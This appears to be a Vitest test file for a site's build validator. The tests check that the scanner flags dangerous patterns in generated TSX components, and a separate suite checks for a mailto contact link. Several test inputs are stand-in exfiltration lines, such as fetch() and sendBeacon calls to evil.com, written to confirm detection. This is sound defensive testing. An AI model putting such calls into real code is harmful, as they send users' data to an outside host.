import { RECOGNISED_ORIGINS } from '../../scripts/utils/site-origin.js'
import { describe, it, expect, afterEach } from 'vitest'
import { writeFileSync, mkdirSync, rmSync, existsSync } from 'node:fs'
import { resolve, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'
import { validateGenerated, contactLinkPresent } from '../../scripts/utils/build-validator.js'

const __dirname = dirname(fileURLToPath(import.meta.url))
const ROOT = resolve(__dirname, '../..')

// We test the scanner by creating temporary test files and running
// validateGenerated against the real ROOT. To avoid polluting the real
// files, we snapshot and restore the files we touch.
const TEST_FILES = ['app/components/__scanner_test.tsx']

function writeTestFile(relPath, content) {
  const abs = resolve(ROOT, relPath)
  mkdirSync(dirname(abs), { recursive: true })
  writeFileSync(abs, content, 'utf8')
}

function cleanupTestFiles() {
  for (const f of TEST_FILES) {
    const abs = resolve(ROOT, f)
    if (existsSync(abs)) rmSync(abs)
  }
}

describe('build validator content scanner', () => {
  afterEach(cleanupTestFiles)

  // validateGenerated reads files on every call, so we just call it directly.
  const runValidator = () => validateGenerated()

  it('passes clean TSX code', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `export function Hello() { return <div>hello world</div> }`
    )
    const result = await runValidator()
    // May have pre-existing errors from other files, but should not flag our test file
    if (!result.success) {
      expect(result.error).not.toContain('__scanner_test.tsx')
    }
  })

  it('flags fetch() calls', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `export function Bad() {
        fetch('https://evil.com/exfil')
        return <div />
      }`
    )
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('fetch() call')
  })

  it('flags eval()', async () => {
    writeTestFile('app/components/__scanner_test.tsx', `const x = eval('alert(1)')`)
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('eval()')
  })

  it('flags dangerouslySetInnerHTML', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `export function X() { return <div dangerouslySetInnerHTML={{ __html: 'x' }} /> }`
    )
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('dangerouslySetInnerHTML')
  })

  it('flags sendBeacon', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `navigator.sendBeacon('https://evil.com', data)`
    )
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('sendBeacon')
  })

  it('flags new Function()', async () => {
    writeTestFile('app/components/__scanner_test.tsx', `const f = new Function('return 1')`)
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('new Function()')
  })

  it('flags disallowed external URLs', async () => {
    writeTestFile('app/components/__scanner_test.tsx', `const url = 'https://evil.com/steal'`)
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('evil.com')
  })

  it('allows URLs to allowlisted hosts (fonts)', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `const url = 'https://fonts.googleapis.com/css2?family=Inter'`
    )
    const result = await runValidator()
    if (!result.success) {
      expect(result.error).not.toContain('__scanner_test.tsx')
    }
  })

  it('allows URLs to github.com', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `const url = 'https://github.com/marchdoe/project'`
    )
    const result = await runValidator()
    if (!result.success) {
      expect(result.error).not.toContain('__scanner_test.tsx')
    }
  })

  it('allows URLs to all allowlisted project domains', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `const urls = [
        'https://spaceman.llc',
        'https://getfishsticks.com',
        'https://15th.club',
${RECOGNISED_ORIGINS.map((o) => `        '${o}',`).join('\n')}
        'https://fonts.gstatic.com/s/inter',
      ]`
    )
    const result = await runValidator()
    if (!result.success) {
      expect(result.error).not.toContain('__scanner_test.tsx')
    }
  })

  it('flags document.write', async () => {
    writeTestFile('app/components/__scanner_test.tsx', `document.write('<p>bad</p>')`)
    const result = await runValidator()
    expect(result.success).toBe(false)
    expect(result.error).toContain('document.write')
  })

  it('ignores dangerous patterns inside comments', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `// Don't use fetch() here
       /* fetch() is bad */
       export function Safe() { return <div /> }`
    )
    const result = await runValidator()
    if (!result.success) {
      expect(result.error).not.toContain('__scanner_test.tsx')
    }
  })

  it('flags inline onclick HTML attribute but not JS property assignment', async () => {
    writeTestFile(
      'app/components/__scanner_test.tsx',
      `el.onclick = () => {} // this is JS, not HTML`
    )
    const result = await runValidator()
    // JS property assignment should NOT be flagged (different from HTML attribute)
    if (!result.success) {
      expect(result.error).not.toContain('__scanner_test.tsx: contains inline onclick')
    }
  })
})

describe('contact link detection (Check 6)', () => {
  const EMAIL = 'hello@dougmar.ch'

  it('accepts the address bound from identity.email', () => {
    // The form the react-engineer contract asks for. It never contains the
    // literal address, so a substring test alone would reject it.
    const src = `<a href={\`mailto:\${identity.email}\`}>{identity.email}</a>`
    expect(contactLinkPresent([src], EMAIL)).toBe(true)
  })

  it('accepts a hardcoded but correct address', () => {
    expect(contactLinkPresent(['<a href="mailto:hello@dougmar.ch">mail</a>'], EMAIL)).toBe(true)
  })

  it('rejects the page anchor that replaced the mailto on 2026-08-29', () => {
    // The real regression: Sidebar.tsx's { href: 'mailto:...', label: 'Contact' }
    // became { label: '03 CONTACT', href: '/#contact' } overnight.
    const src = "const items = [{ label: '03 CONTACT', href: '/#contact' }]"
    expect(contactLinkPresent([src], EMAIL)).toBe(false)
  })

  it('rejects a stale address left behind after the canonical one moves', () => {
    expect(contactLinkPresent(['<a href="mailto:hello@doug-march.com">x</a>'], EMAIL)).toBe(false)
  })

  it('rejects an interpolation that binds something other than identity.email', () => {
    const src = `<a href={\`mailto:\${project.contact}\`}>x</a>`
    expect(contactLinkPresent([src], EMAIL)).toBe(false)
  })

  it('is satisfied by any one file in the set, not every file', () => {
    // Footer may carry it while Sidebar does not. The question is site-wide.
    const sidebar = "{ label: 'CONTACT', href: '/#contact' }"
    const footer = `<a href={\`mailto:\${identity.email}\`}>mail</a>`
    expect(contactLinkPresent([sidebar, footer], EMAIL)).toBe(true)
  })

  it('finds no link in an empty set', () => {
    expect(contactLinkPresent([], EMAIL)).toBe(false)
  })
})
